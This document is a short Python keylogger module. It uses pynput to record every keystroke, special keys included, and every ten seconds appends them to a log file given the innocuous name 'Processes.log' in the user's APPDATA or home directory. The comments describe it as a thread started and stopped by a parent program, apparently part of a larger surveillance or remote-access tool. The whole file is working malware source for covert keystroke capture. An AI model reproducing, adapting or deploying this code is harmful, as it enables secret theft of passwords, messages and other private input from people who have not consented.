#!/usr/bin/python3

from termcolor import colored
import os, sys
import pynput.keyboard as kb
import threading
from time import sleep

log = ""
try:
	path = os.environ["appdata"] + "\\Processes.log"
except KeyError:
	path = os.environ["HOME"] + "/Processes.log"

def proc_Keys(key):
	global log
	try:
		log += str(key.char)
	except AttributeError:
		if key == key.space:
			log += " "
		elif key == key.enter:
			log += " [" + str(key) + "]\n"
		elif key == key.tab:
			log += " [" + str(key) + "]\t"
		else:
			log += " [" + str(key) + "] "
		

def report(stop_key):
	
	global log, path, key_listener
	while not stop_key.is_set():
		file = open(path, "a")
		file.write(log)
		log = ""
		file.close()	
		sleep(10)
	key_listener.stop()

key_listener = kb.Listener(on_press=proc_Keys)


# WORKS AS THE MAIN FUNCTION, FROM HERE THE SCRIPT STARTS FUNCTIONING
# TAKES IN stopFlag AS AN ARGUMENT OF TYPE FUNCTION OBJECT
# FROM THE PROGRAM THAT CALLS THIS SCRIPT
# THIS ARGUMENT, WHILE False WILL CONTINUE RUNNING THIS SCRIPT
# AND WILL QUIT THE SCRIPT ON A True VALUE

# THIS FUNCTIONALITY ENABLES HANDLING OF THIS SCRIPT
# AS IT WILL RUN AS A SEPARATE THREAD 
# WHEN THE stopFlag IS TRUE, THIS SCRIPT IS TERMINATED,
# THUS KILLING THE THREAD CREATED FROM THE PARENT FUNCTION
def startKL(stop_key):
	global key_listener
	with key_listener:
		report(stop_key)
		key_listener.join()
	sys.exit()
